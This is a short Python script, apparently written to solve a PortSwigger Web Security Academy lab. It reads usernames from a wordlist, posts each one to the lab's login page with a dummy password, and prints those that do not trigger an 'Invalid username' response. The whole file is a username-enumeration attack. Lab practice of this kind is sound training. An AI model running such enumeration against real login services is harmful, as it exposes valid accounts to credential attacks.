import requests
import re

usernames=open("psusernames.txt","r")

for i in usernames:
    data = {'username': i.strip(), 'password': "test"}
    respuesta = requests.post('https://0a5c00130346041581310281005c0059.web-security-academy.net/login', data)
    coincidencia1 = re.findall("Invalid username",respuesta.text)
    if coincidencia1 == []:
    	print("Username encontrado: "+i.strip())

